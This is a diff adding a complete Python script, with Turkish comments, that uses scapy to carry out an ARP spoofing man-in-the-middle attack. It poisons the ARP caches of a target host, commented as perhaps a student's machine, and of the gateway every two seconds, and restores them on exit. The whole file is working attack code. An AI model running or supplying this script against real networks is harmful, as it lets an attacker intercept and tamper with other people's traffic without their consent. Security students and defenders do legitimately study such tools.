@@ -1,0 +1,41 @@
+from scapy.all import ARP, Ether, send, srp
+import time
+import sys
+
+# Hedef IP ve ağ geçidi IP'sini belirle
+target_ip = "10.0.2.7"        # Hedef cihazın IP'si (örneğin öğrencinin makinesi)
+gateway_ip = "10.0.2.1"       # Ağ geçidinin IP'si (modemin IP'si)
+
+# MAC adresini öğrenme fonksiyonu
+def get_mac(ip):
+    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
+    answered_list = srp(arp_request, timeout=2, verbose=False)[0]
+    return answered_list[0][1].hwsrc
+
+# ARP spoofing paketi gönderme fonksiyonu
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(arp_response, verbose=False)
+
+# ARP tablolarını düzeltme fonksiyonu
+def restore(target_ip, gateway_ip):
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
+    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+    send(arp_response, verbose=False)
+    print("[+] ARP Tabloları Düzeltildi")
+
+try:
+    print("[*] MITM Saldırısı Başlıyor... (CTRL+C ile durdurabilirsiniz)")
+    while True:
+        # Hedef cihazı ağ geçidine yönlendir
+        spoof(target_ip, gateway_ip)
+        # Ağ geçidini hedef cihaza yönlendir
+        spoof(gateway_ip, target_ip)
+        time.sleep(2)  # 2 saniyede bir paket gönder
+except KeyboardInterrupt:
+    print("\n[-] Saldırı Durduruluyor...")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    sys.exit(0)
